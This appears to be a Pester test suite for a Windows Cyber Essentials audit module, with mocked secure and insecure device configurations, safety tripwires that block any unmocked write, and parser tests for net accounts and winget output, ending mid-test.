#Requires -Modules Pester
<#
    Unit tests. Windows-only cmdlets are stubbed and mocked, so these run on
    Windows PowerShell 5.1, PowerShell 7 on Windows, and PowerShell 7 on Linux (CI).

    Run:  Invoke-Pester -Path .\tests -Output Detailed
#>

BeforeAll {
    # The suite mocks every Windows write it knows about, but a forgotten mock must not be able to
    # change this machine. Refuse to run elevated outside CI (set CE_TESTS_ALLOW_ELEVATED=1 to override).
    if ($env:OS -eq 'Windows_NT' -and -not $env:CI -and -not $env:CE_TESTS_ALLOW_ELEVATED) {
        $principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            throw 'Refusing to run the test suite elevated: run it as a standard user, or set CE_TESTS_ALLOW_ELEVATED=1 in a disposable VM or Windows Sandbox.'
        }
    }

    $script:RepoRoot = Split-Path -Parent $PSScriptRoot
    $modulePath = Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'CEAudit.psd1'

    # Stubs for Windows-only commands so Pester can mock them on any OS. They
    # declare the parameters the module uses so mocks can read them.
    $stubs = @(
        'Get-NetFirewallProfile', 'Get-NetFirewallRule', 'Get-NetFirewallAddressFilter', 'Set-NetFirewallProfile', 'Disable-NetFirewallRule',
        'Get-LocalUser', 'Get-LocalGroupMember', 'Disable-LocalUser', 'Enable-LocalUser',
        'Get-WindowsOptionalFeature', 'Disable-WindowsOptionalFeature', 'Get-CimInstance',
        'Get-Service', 'Set-Service', 'Stop-Service', 'Get-WinEvent',
        'Get-MpComputerStatus', 'Get-MpPreference', 'Set-MpPreference', 'Add-MpPreference', 'Remove-MpPreference', 'Update-MpSignature',
        'Get-AppLockerPolicy', 'Get-BitLockerVolume', 'Confirm-SecureBootUEFI', 'Get-SecureBootUEFI', 'Start-ScheduledTask', 'Get-WindowsFeature', 'Get-MpThreat', 'Get-MpThreatDetection', 'Get-VM', 'Get-VMSwitch', 'Get-VMNetworkAdapter', 'Get-NetNatStaticMapping', 'Get-NetTCPConnection'
    )
    $stubBody = {
        [CmdletBinding()]
        param(
            [Parameter(Position = 0)]$Name, $ClassName, $Namespace, $FeatureName, $PolicyStore, $MountPoint,
            $Direction, $Enabled, $Action, $SID, $ListLog, $TaskPath, $TaskName, $VMName, $State, [switch]$Online, [switch]$Effective, [switch]$Xml,
            [Parameter(ValueFromPipeline)]$InputObject,
            [Parameter(ValueFromRemainingArguments)]$Rest
        )
        process { }
    }
    foreach ($s in $stubs) {
        if (-not (Get-Command $s -ErrorAction SilentlyContinue)) {
            Set-Item -Path "function:global:$s" -Value $stubBody
        }
    }

    Import-Module $modulePath -Force

    # Tripwires: every command that can change the device throws unless a test mocks it deliberately.
    # A narrower mock (in a Describe, It or InModuleScope) takes precedence, so existing tests keep working;
    # a test that forgets to mock a write fails loudly instead of touching the host.
    $script:MutatingCommands = @(
        'Set-ItemProperty', 'New-ItemProperty', 'Remove-ItemProperty', 'Set-Service', 'Stop-Service', 'Restart-Service',
        'Set-NetFirewallProfile', 'Set-NetFirewallRule', 'Enable-NetFirewallRule', 'Disable-NetFirewallRule',
        'Enable-LocalUser', 'Disable-LocalUser', 'Add-MpPreference', 'Remove-MpPreference', 'Set-MpPreference', 'Update-MpSignature',
        'Enable-WindowsOptionalFeature', 'Disable-WindowsOptionalFeature', 'Suspend-BitLocker', 'Start-ScheduledTask',
        'Start-Process', 'Invoke-Expression', 'New-EventLog', 'Write-EventLog',
        'Set-CESecurityPolicyValue', 'Invoke-CENative'
    )
    function global:Set-TestTripwires {
        # Re-run after any Import-Module -Force: a fresh module instance has no mocks.
        foreach ($cmd in $script:MutatingCommands) {
            # Resolve inside the module so private helpers (Invoke-CENative, Set-CESecurityPolicyValue) are covered too.
            $known = & (Get-Module CEAudit) { param($n) [bool](Get-Command $n -ErrorAction SilentlyContinue) } $cmd
            if ($known) { Mock -ModuleName CEAudit $cmd { throw "Tripwire: a test reached $cmd without mocking it" }.GetNewClosure() }
        }
        # New-Item creates report folders legitimately; only registry keys are off limits. One default mock
        # that decides in the body: Pester 6 has no fallback when a -ParameterFilter does not match.
        Mock -ModuleName CEAudit New-Item {
            if ("$Path$LiteralPath" -match '^(HK(LM|CU|CR|U|CC):|Registry::)') { throw 'Tripwire: a test reached New-Item on a registry path without mocking it' }
            Microsoft.PowerShell.Management\New-Item @PesterBoundParameters
        }
    }
    Set-TestTripwires

    function global:New-TestHardware {
        <# A recent laptop with patched TPM firmware; -Insecure gives old BIOS and ROCA-affected TPM firmware. #>
        param([switch]$Insecure)
        $biosDate = if ($Insecure) { (Get-Date).AddDays(-1900) } else { (Get-Date).AddDays(-60) }
        [pscustomobject]@{
            Manufacturer = 'Contoso'; Model = 'Laptop 14 G5'; SystemSku = 'CT14G5'; SerialNumber = 'SN-TEST-001'; Baseboard = 'Contoso 8A3B'; BaseboardProduct = '8A3B'
            IsVirtualMachine = $false
            Firmware = [pscustomobject]@{ Vendor = 'Contoso'; Version = $(if ($Insecure) { '1.02.0' } else { '1.20.0' }); ReleaseDate = $biosDate.ToString('yyyy-MM-dd'); Type = 'UEFI' }
            Tpm = [pscustomobject]@{ Readable = $true; Present = $true; Manufacturer = 'IFX'; FirmwareVersion = $(if ($Insecure) { '7.40.2098.0' } else { '7.63.3353.0' }); SpecVersion = '2.0' }
            Cpu = @([pscustomobject]@{ Name = 'Contoso CPU 7'; Manufacturer = 'GenuineIntel'; Cores = 8; LogicalProcessors = 8; MicrocodeRevision = '0x11A' })
            Disks = @([pscustomobject]@{ Model = 'Contoso NVMe 1TB'; FirmwareRevision = '4B2QJXD7'; InterfaceType = 'SCSI'; SizeGB = 954; SerialNumber = 'DSK-001' })
            Errors = @()
        }
    }

    function global:New-TestContext {
        param([hashtable]$Override = @{})
        $ctx = [ordered]@{
            ComputerName = 'TESTPC'; OSFamily = 'Windows 11'; ProductName = 'Windows 10 Pro'; EditionID = 'Professional'
            EditionClass = 'Pro'; DisplayVersion = '25H2'; Build = 26200; UBR = 6584; FullBuild = '26200.6584'
            DomainJoined = $false; EntraJoined = $false; MdmEnrolled = $false; HelloProvisioned = $false
            RunningAs = 'TESTPC\admin'; ConsoleUser = 'TESTPC\paul'; IsElevated = $true; IsSystem = $false; ConsoleUserSid = $null; PSVersion = '7.4'
            AuditTime = (Get-Date); CentrallyManaged = $false
            Hardware = (New-TestHardware)
        }
        foreach ($k in $Override.Keys) { $ctx[$k] = $Override[$k] }
        return [pscustomobject]$ctx
    }

    function global:Set-TestDevice {
        <# Installs mocks describing either an 'insecure' or a 'secure' device. #>
        param([ValidateSet('Insecure', 'Secure')][string]$Kind, [hashtable]$ContextOverride = @{})

        $secure = ($Kind -eq 'Secure')
        $global:CETestCtx = New-TestContext $ContextOverride
        if (-not $secure -and -not $ContextOverride.ContainsKey('Hardware')) { $global:CETestCtx.Hardware = New-TestHardware -Insecure }
        $global:CETestReg = @{}
        $reg = $global:CETestReg
        if ($secure) {
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer|NoDriveTypeAutoRun'] = 255
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer|NoAutorun'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer|NoAutoplayfornonVolume'] = 1
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System|InactivityTimeoutSecs'] = 600
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork\PINComplexity|MinimumPINLength'] = 6
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\System|EnableSmartScreen'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\System|ShellSmartScreenLevel'] = 'Block'
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Edge|SmartScreenEnabled'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Edge|SmartScreenPuaEnabled'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Edge|PreventSmartScreenPromptOverrideForFiles'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Lsa|RunAsPPL'] = 2
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Lsa|RestrictAnonymous'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient|EnableMulticast'] = 0
            $reg['HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters|RequireSecuritySignature'] = 1
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit|ProcessCreationIncludeCmdLine_Enabled'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging|EnableScriptBlockLogging'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy|VerifiedAndReputablePolicyState'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|UEFICA2023Status'] = 'Updated'
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|WindowsUEFICA2023Capable'] = 2
        }
        else {
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server|fDenyTSConnections'] = 0
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp|UserAuthentication'] = 0
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU|NoAutoUpdate'] = 1
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System|EnableLUA'] = 0
            $reg['HKLM:\SOFTWARE\Policies\Google\Chrome|SafeBrowsingProtectionLevel'] = 0
            $reg['HKLM:\SOFTWARE\Policies\Google\Update|UpdateDefault'] = 0
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest|UseLogonCredential'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance|fAllowToGetHelp'] = 1
        }

        Mock -ModuleName CEAudit Get-CEDeviceContext { $global:CETestCtx }
        Mock -ModuleName CEAudit Get-CEFirmwareCatalogRecord { [pscustomobject]@{ Status = 'Disabled'; Record = $null; FromCache = $false; Message = 'test'; Key = $null } }
        Mock -ModuleName CEAudit Get-CERegistryValue {
            $k = "$Path|$Name"
            if ($global:CETestReg.ContainsKey($k)) { return $global:CETestReg[$k] }
            return $Default
        }
        Mock -ModuleName CEAudit Test-CEPendingReboot { -not $global:CETestSecure }
        $global:CETestSecure = $secure

        $fwEnabled = if ($secure) { 'True' } else { 'False' }
        $fwInbound = if ($secure) { 'Block' } else { 'Allow' }
        $global:CETestFw = @('Domain', 'Private', 'Public') | ForEach-Object {
            [pscustomobject]@{ Name = $_; Enabled = $fwEnabled; DefaultInboundAction = $fwInbound; AllowInboundRules = $(if ($secure) { 'False' } else { 'True' }); LogBlocked = 'True'; LogMaxSizeKilobytes = 16384 }
        }
        Mock -ModuleName CEAudit Get-NetFirewallProfile {
            if ($Name) { return $global:CETestFw | Where-Object Name -eq $Name }
            return $global:CETestFw
        }
        Mock -ModuleName CEAudit Get-NetFirewallRule {
            if ($global:CETestSecure) { return @() }
            [pscustomobject]@{ Name = '{1234-ABCD}'; DisplayName = 'Old game server'; DisplayGroup = $null; Profile = 'Any' }
        }
        Mock -ModuleName CEAudit Get-NetFirewallAddressFilter { [pscustomobject]@{ RemoteAddress = 'Any' } }

        Mock -ModuleName CEAudit Get-CimInstance {
            switch ($ClassName) {
                'FirewallProduct' { @() }
                'AntiVirusProduct' {
                    [pscustomobject]@{ displayName = 'Microsoft Defender Antivirus'; productState = $(if ($global:CETestSecure) { 0x61100 } else { 0x61110 }) }
                }
                'Win32_DeviceGuard' {
                    [pscustomobject]@{ VirtualizationBasedSecurityStatus = 2; SecurityServicesRunning = $(if ($global:CETestSecure) { @(2) } else { @(0) }); UsermodeCodeIntegrityPolicyEnforcementStatus = 0 }
                }
                'Win32_Tpm' { [pscustomobject]@{ SpecVersion = '2.0, 0, 1.59' } }
                'Win32_SystemDriver' { $global:CETestDrivers }
                default { $null }
            }
        }

        $users = @(
            [pscustomobject]@{ Name = 'Administrator'; SID = 'S-1-5-21-1-2-3-500'; Enabled = (-not $secure); PasswordRequired = $true; LastLogon = $null },
            [pscustomobject]@{ Name = 'Guest'; SID = 'S-1-5-21-1-2-3-501'; Enabled = (-not $secure); PasswordRequired = $false; LastLogon = $null },
            [pscustomobject]@{ Name = 'paul'; SID = 'S-1-5-21-1-2-3-1001'; Enabled = $true; PasswordRequired = $true; LastLogon = (Get-Date).AddDays(-1) }
        )
        if (-not $secure) {
            $users += [pscustomobject]@{ Name = 'olduser'; SID = 'S-1-5-21-1-2-3-1002'; Enabled = $true; PasswordRequired = $false; LastLogon = (Get-Date).AddDays(-400) }
        }
        $global:CETestUsers = $users
        Mock -ModuleName CEAudit Get-LocalUser { $global:CETestUsers }
        Mock -ModuleName CEAudit Get-LocalGroupMember {
            $m = @([pscustomobject]@{ Name = 'TESTPC\admin'; ObjectClass = 'User'; PrincipalSource = 'Local'; SID = 'S-1-5-21-1-2-3-1003' })
            if (-not $global:CETestSecure) {
                $m += [pscustomobject]@{ Name = 'TESTPC\paul'; ObjectClass = 'User'; PrincipalSource = 'Local'; SID = 'S-1-5-21-1-2-3-1001' }
                $m += [pscustomobject]@{ Name = 'TESTPC\olduser'; ObjectClass = 'User'; PrincipalSource = 'Local'; SID = 'S-1-5-21-1-2-3-1002' }
            }
            $m
        }
        Mock -ModuleName CEAudit Get-WindowsOptionalFeature {
            $state = if ($global:CETestSecure) { 'Disabled' } else { 'Enabled' }
            [pscustomobject]@{ FeatureName = $FeatureName; State = $state }
        }
        # Anti-malware: services, loaded drivers and minifilters (fltmc) seen by MP-01.
        $global:CETestServiceList = @([pscustomobject]@{ Name = 'WinDefend'; Status = 'Running'; StartType = 'Automatic' })
        $global:CETestDrivers = @()
        $global:CETestFltmc = @(
            '', 'Filter Name                     Num Instances    Altitude    Frame',
            '------------------------------  -------------  ------------  -----',
            'bindflt                                 1       409800         0',
            'WdFilter                                6       328010         0',
            'storqosflt                              0       244000         0',
            'FileInfo                                6        40500         0')
        Mock -ModuleName CEAudit Get-Service {
            if (-not $Name) { return $global:CETestServiceList }
            $start = if ($global:CETestSecure) { 'Disabled' } else { 'Automatic' }
            if ($Name -eq 'wuauserv') { $start = 'Manual' }
            [pscustomobject]@{ Name = $Name; StartType = $start; Status = 'Running' }
        }

        Mock -ModuleName CEAudit Invoke-CENative {
            $out = switch -Regex ($FilePath) {
                'net\.exe' {
                    if ($global:CETestSecure) {
                        @('Force user logoff how long after time expires?:       Never', 'Minimum password age (days):                          0',
                          'Maximum password age (days):                          Unlimited', 'Minimum password length:                              12',
                          'Length of password history maintained:                None', 'Lockout threshold:                                    10',
                          'Lockout duration (minutes):                           10', 'Lockout observation window (minutes):                 10',
                          'Computer role:                                        WORKSTATION', 'The command completed successfully.')
                    }
                    else {
                        @('Force user logoff how long after time expires?:       Never', 'Minimum password age (days):                          0',
                          'Maximum password age (days):                          42', 'Minimum password length:                              0',
                          'Length of password history maintained:                None', 'Lockout threshold:                                    Never',
                          'Lockout duration (minutes):                           30', 'Lockout observation window (minutes):                 30',
                          'Computer role:                                        WORKSTATION', 'The command completed successfully.')
                    }
                }
                'whoami' {
                    '"BUILTIN\Users","Alias","S-1-5-32-545","Mandatory group, Enabled by default, Enabled group"'
                    if (-not $global:CETestSecure) { '"BUILTIN\Administrators","Alias","S-1-5-32-544","Group used for deny only"' }
                }
                'fltmc' { $global:CETestFltmc }
                default { @() }
            }
            [pscustomobject]@{ ExitCode = 0; Output = @($out) }
        }
        Mock -ModuleName CEAudit Get-CESecurityPolicy { @{ PasswordComplexity = $(if ($global:CETestSecure) { '0' } else { '1' }) } }
        Mock -ModuleName CEAudit Get-CEAuditPolicy {
            $setting = if ($global:CETestSecure) { 'Success and Failure' } else { 'No Auditing' }
            $map = @{}
            foreach ($g in @('0cce922b', '0cce9215', '0cce923f', '0cce9235', '0cce9237', '0cce9217', '0cce922f')) {
                $map["$g-69ae-11d9-bed3-505054503030"] = [pscustomobject]@{ Name = $g; Setting = $setting }
            }
            $map
        }
        Mock -ModuleName CEAudit Get-CEWindowsUpdateState {
            $pending = @()
            if (-not $global:CETestSecure) {
                $pending += [pscustomobject]@{ Title = '2026-08 Cumulative Update'; KB = 'KB5099999'; Severity = 'Critical'; Released = (Get-Date).AddDays(-30); IsSecurity = $true; Categories = 'Security Updates' }
            }
            [pscustomobject]@{ Pending = $pending; History = @([pscustomobject]@{ Title = 'x'; Date = (Get-Date).AddDays(-3); ResultCode = 2 }) }
        }
        Mock -ModuleName CEAudit Get-CEWingetUpgrades {
            $pkgs = @()
            if (-not $global:CETestSecure) { $pkgs = @([pscustomobject]@{ Name = '7-Zip'; Id = '7zip.7zip'; Version = '23.01'; Available = '25.01'; Source = 'winget' }) }
            [pscustomobject]@{ Available = $true; Packages = $pkgs }
        }
        # The machine-wide VS Code folder is real on CI runners; keep built-in extension scanning out of device mocks.
        Mock -ModuleName CEAudit Get-CEVsCodeBuiltInExtensionDir { , @() }
        Mock -ModuleName CEAudit Get-CEInstalledSoftware {
            $s = @([pscustomobject]@{ Name = 'Microsoft OneDrive'; Version = '25.1'; Publisher = 'Microsoft'; InstallDate = '' })
            if (-not $global:CETestSecure) {
                $s += [pscustomobject]@{ Name = 'Python 3.8.10 (64-bit)'; Version = '3.8.10'; Publisher = 'PSF'; InstallDate = '' }
                $s += [pscustomobject]@{ Name = 'AnyDesk'; Version = '9'; Publisher = 'AnyDesk'; InstallDate = '' }
                $s += [pscustomobject]@{ Name = 'Google Chrome'; Version = '140'; Publisher = 'Google'; InstallDate = '' }
            }
            $s
        }
        Mock -ModuleName CEAudit Get-MpComputerStatus {
            $on = $global:CETestSecure
            [pscustomobject]@{
                AMRunningMode = 'Normal'; AntivirusEnabled = $true; RealTimeProtectionEnabled = $on; BehaviorMonitorEnabled = $true
                IoavProtectionEnabled = $true; OnAccessProtectionEnabled = $true; IsTamperProtected = $on
                AntivirusSignatureLastUpdated = $(if ($on) { (Get-Date).AddHours(-2) } else { (Get-Date).AddDays(-9) })
                AntivirusSignatureVersion = '1.1'; AMEngineVersion = '1.1'; AMProductVersion = '4.18'
            }
        }
        # No virtual machines, WSL or containers unless a test sets them up (keeps this machine's real WSL out of the results).
        Mock -ModuleName CEAudit Get-CEVirtualisationState {
            [pscustomobject]@{ HyperV = [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() }
                VMware = @(); VirtualBox = @(); Wsl = @(); WslNetworking = ''; Containers = @(); Listeners = @(); Notes = @(); VmFileNotes = @(); UnreadVmFiles = @() }
        }
        # No AI tools unless a test sets them up (keeps this machine's real apps out of the results).
        Mock -ModuleName CEAudit Get-CEAIToolState { [pscustomobject]@{ Tools = @(); UninspectedProcesses = @() } }
        Mock -ModuleName CEAudit Get-CEMcpInventory { [ordered]@{ mcpConfigsFound = 0; mcpConfigsParsed = 0; mcpConfigsUnreadable = @(); mcpServers = @(); credentialsFound = 0; credentialsPlaintext = 0; scanBounds = 'test' } }
        Mock -ModuleName CEAudit Get-MpThreat { @() }
        Mock -ModuleName CEAudit Get-MpThreatDetection { @() }
        Mock -ModuleName CEAudit Get-MpPreference {
            if ($global:CETestSecure) {
                $ids = @((Get-CEConfig).'asr-rules'.rules | ForEach-Object { $_.id })
                [pscustomobject]@{ MAPSReporting = 2; SubmitSamplesConsent = 1; PUAProtection = 1; EnableNetworkProtection = 1
                    AttackSurfaceReductionRules_Ids = $ids; AttackSurfaceReductionRules_Actions = @($ids | ForEach-Object { 1 })
                    ExclusionPath = @(); ExclusionExtension = @(); ExclusionProcess = @() }
            }
            else {
                [pscustomobject]@{ MAPSReporting = 0; SubmitSamplesConsent = 2; PUAProtection = 0; EnableNetworkProtection = 0
                    AttackSurfaceReductionRules_Ids = @(); AttackSurfaceReductionRules_Actions = @()
                    ExclusionPath = @('C:\', 'C:\Tools\build'); ExclusionExtension = @('exe'); ExclusionProcess = @() }
            }
        }
        Mock -ModuleName CEAudit Get-BitLockerVolume {
            if ($global:CETestSecure) {
                [pscustomobject]@{ VolumeStatus = 'FullyEncrypted'; ProtectionStatus = 'On'; EncryptionMethod = 'XtsAes256'
                    KeyProtector = @([pscustomobject]@{ KeyProtectorType = 'TpmPin' }, [pscustomobject]@{ KeyProtectorType = 'RecoveryPassword' }) }
            }
            else {
                [pscustomobject]@{ VolumeStatus = 'FullyDecrypted'; ProtectionStatus = 'Off'; EncryptionMethod = 'None'; KeyProtector = @() }
            }
        }
        Mock -ModuleName CEAudit Confirm-SecureBootUEFI { $global:CETestSecure }
        $global:CETestSbVars = if ($secure) {
            @{ db = 'Microsoft Windows Production PCA 2011 Microsoft Corporation UEFI CA 2011 Windows UEFI CA 2023 Microsoft UEFI CA 2023 Microsoft Option ROM UEFI CA 2023'
               KEK = 'Microsoft Corporation KEK CA 2011 Microsoft Corporation KEK 2K CA 2023' }
        }
        else {
            @{ db = 'Microsoft Windows Production PCA 2011 Microsoft Corporation UEFI CA 2011'; KEK = 'Microsoft Corporation KEK CA 2011' }
        }
        $global:CETestSbEvents = @()
        Mock -ModuleName CEAudit Get-CESecureBootVariableText { $global:CETestSbVars[$Name] }
        Mock -ModuleName CEAudit Get-CESecureBootEvent { $global:CETestSbEvents }
        Mock -ModuleName CEAudit Get-AppLockerPolicy { throw 'not available' }
        Mock -ModuleName CEAudit Get-WinEvent { [pscustomobject]@{ MaximumSizeInBytes = $(if ($global:CETestSecure) { 2GB } else { 20MB }) } }
    }
}

Describe 'Module structure' {
    It 'loads 58 checks with unique ids' {
        $checks = Get-CECheck
        $checks.Count | Should -Be 58
        ($checks.Id | Sort-Object -Unique).Count | Should -Be $checks.Count
    }

    It 'every check maps to at least one framework and a reference' {
        foreach ($c in Get-CECheck) {
            $c.Frameworks.Count | Should -BeGreaterThan 0 -Because $c.Id
            $c.Reference | Should -Not -BeNullOrEmpty -Because $c.Id
        }
    }

    It 'every remediation referenced by a check exists in the library' {
        $files = Get-ChildItem -Path (Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'Checks') -Filter *.ps1
        $refs = $files | Select-String -Pattern "New-CERemediationRef -Id '([A-Za-z0-9-]+)'" -AllMatches |
            ForEach-Object { $_.Matches } | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique
        $lib = (Get-CERemediation).Id
        foreach ($r in $refs) { $lib | Should -Contain $r }
    }

    It 'high-risk remediations are never selected by default' {
        Get-CERemediation | Where-Object Risk -eq 'High' | ForEach-Object { $_.SelectedByDefault | Should -BeFalse -Because $_.Id }
    }

    It 'the CE v3.3 auto-fail areas are flagged' {
        (Get-CECheck -Id 'SU-03').AutoFail | Should -BeTrue
        (Get-CECheck -Id 'SU-05').AutoFail | Should -BeTrue
        (Get-CECheck -Id 'UA-07').AutoFail | Should -BeTrue
    }

    It 'source files are ASCII only (Windows PowerShell 5.1 safe)' {
        $files = Get-ChildItem -Path $script:RepoRoot -Recurse -Include *.ps1, *.psm1, *.psd1 | Where-Object { $_.FullName -notmatch '[\\/]output[\\/]' }
        foreach ($f in $files) {
            $bytes = [IO.File]::ReadAllBytes($f.FullName)
            @($bytes | Where-Object { $_ -gt 127 }).Count | Should -Be 0 -Because $f.Name
        }
    }
}

Describe 'Static invariants' {
    BeforeAll {
        $script:srcDir = Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit'
        function global:Get-CommandNames {
            # Names of commands invoked in a file (CommandAst only, so names inside strings do not count).
            param([string]$Path)
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($Path, [ref]$null, [ref]$null)
            @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] }, $true) |
                ForEach-Object { $_.GetCommandName() } | Where-Object { $_ } | Sort-Object -Unique)
        }
    }

    It 'tripwires fire when module code reaches a mutating command without a mock' {
        # Exercised the way real code hits them: a module function writing the registry, and a native call.
        InModuleScope CEAudit {
            $caught = ''
            try { Set-CERegistryValueTracked -Path 'HKCU:\Software\CETestNoWrite' -Name 'x' -Value 1 -Undo ([System.Collections.ArrayList]@()) } catch { $caught = $_.Exception.Message }
            $caught | Should -Match 'Tripwire.*New-Item'
            $caught = ''
            try { Invoke-CENative -FilePath 'net.exe' -ArgumentList @('accounts') } catch { $caught = $_.Exception.Message }
            $caught | Should -Match 'Tripwire.*Invoke-CENative'
        }
        Test-Path 'HKCU:\Software\CETestNoWrite' | Should -BeFalse
    }

    It 'checks only read: no check file invokes a command that changes the device' {
        # "Read first. Change nothing." - enforced on the AST, not by review.
        $deny = @($script:MutatingCommands | Where-Object { $_ -ne 'Invoke-CENative' }) + @(
            'Remove-Item', 'New-Item', 'Set-Content', 'Add-Content', 'Out-File', 'Copy-Item', 'Move-Item', 'Rename-Item',
            'Register-ScheduledTask', 'Unregister-ScheduledTask', 'Set-ScheduledTask', 'Set-CERegistryValueTracked', 'Add-CEUndoCommand',
            'net', 'net.exe', 'auditpol', 'auditpol.exe', 'wevtutil', 'wevtutil.exe', 'secedit', 'secedit.exe', 'reg', 'reg.exe', 'sc', 'sc.exe')
        $problems = foreach ($file in Get-ChildItem (Join-Path $script:srcDir 'Checks') -Filter *.ps1) {
            foreach ($name in (Get-CommandNames $file.FullName)) {
                if ($deny -contains $name) { "$($file.Name) calls $name" }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }

    It 'checks run native tools only to read' {
        # Invoke-CENative is the one way a check reaches outside PowerShell; every use must be a known query.
        $allowed = @('whoami.exe /groups', 'fltmc.exe filters', 'winget upgrade')
        $problems = foreach ($file in Get-ChildItem (Join-Path $script:srcDir 'Checks') -Filter *.ps1) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
            $calls = $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] -and $args[0].GetCommandName() -eq 'Invoke-CENative' }, $true)
            foreach ($call in $calls) {
                $text = $call.Extent.Text -replace '\s+', ' '
                $exe = [regex]::Match($text, '-FilePath (?:''([^'']+)''|\$(\w+))').Groups
                $first = [regex]::Match($text, '-ArgumentList @\(''([^'']+)''').Groups[1].Value
                $key = "$(if ($exe[1].Value) { $exe[1].Value } else { $exe[2].Value }) $first"
                if ($allowed -notcontains $key) { "$($file.Name): $key" }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }

    It 'front-end scripts only call functions the module exports' {
        # The app runs outside the module: a private function resolves at authoring time (and in this
        # suite, which dot-sources the app) but not at runtime. Everything it calls must be its own,
        # exported from CEAudit.psd1, or a real command.
        $manifest = Import-PowerShellDataFile (Join-Path $script:srcDir 'CEAudit.psd1')
        $exported = @($manifest.FunctionsToExport)
        $modulePrivate = @(Get-ChildItem (Join-Path $script:srcDir 'Private') -Filter *.ps1 | ForEach-Object {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($_.FullName, [ref]$null, [ref]$null)
            $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) | ForEach-Object Name
        })
        $problems = foreach ($file in Get-ChildItem (Join-Path $script:RepoRoot 'app') -Filter *.ps1) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
            $own = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) | ForEach-Object Name)
            foreach ($name in (Get-CommandNames $file.FullName)) {
                if ($own -contains $name -or $exported -contains $name) { continue }
                if ($modulePrivate -contains $name) { "$($file.Name) calls private module function $name"; continue }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }
}

Describe 'Parsers' {
    It 'parses net accounts output' {
        InModuleScope CEAudit {
            Mock Invoke-CENative {
                [pscustomobject]@{ ExitCode = 0; Output = @(
                    'Force user logoff how long after time expires?:       Never',
                    'Minimum password age (days):                          0',
                    'Maximum password age (days):                          Unlimited',
                    'Minimum password length:                              12',
                    'Length of password history maintained:                None',
                    'Lockout threshold:                                    10',
                    'Lockout duration (minutes):                           10',
                    'Lockout observation window (minutes):                 10',
                    'Computer role:                                        WORKSTATION',
                    'The command completed successfully.') }
            }
            $p = Get-CEAccountPolicy
            $p.MinPasswordLength | Should -Be 12
            $p.MaxPasswordAgeDays | Should -Be -1
            $p.LockoutThreshold | Should -Be 10
            $p.LockoutWindowMinutes | Should -Be 10
        }
    }

    It 'treats a "Never" lockout threshold as 0' {
        InModuleScope CEAudit {
            Mock Invoke-CENative {
                [pscustomobject]@{ ExitCode = 0; Output = @('a: Never', 'b: 0', 'c: 42', 'd: 0', 'e: None', 'f: Never', 'g: 30', 'h: 30', 'i: WORKSTATION') }
            }
            (Get-CEAccountPolicy).LockoutThreshold | Should -Be 0
        }
    }

    It 'parses winget upgrade tables' {
        InModuleScope CEAudit {
            $cr = [char]13
            $ell = [char]0x2026
            $lines = @(
                ("   - $cr   \ $cr   | $cr" + (' ' * 80) + "${cr}Name                               Id                          Version        Available      Source"),
                ('-' * 119),
                '7-Zip 23.01 (x64)                  7zip.7zip                   23.01          25.01          winget',
                'Microsoft Visual Studio Code (User) Microsoft.VisualStudioCode 1.100.0        1.104.0        winget',
                "Some Very Long Application Name    Contoso.SomeVeryLongApp$ell    1.0            2.0            winget",
                '3 upgrades available.',
                '',
                'The following packages have an upgrade available, but require explicit targeting for upgrade:',
                'Name                                         Id                                    Version   Available Source',
                ('-' * 109),
                'Discord                                      Discord.Discord                       1.0.9163  1.0.9200  winget',
                "1 package(s) have pins that prevent upgrade. Use the 'winget pin' command to view and edit pins."
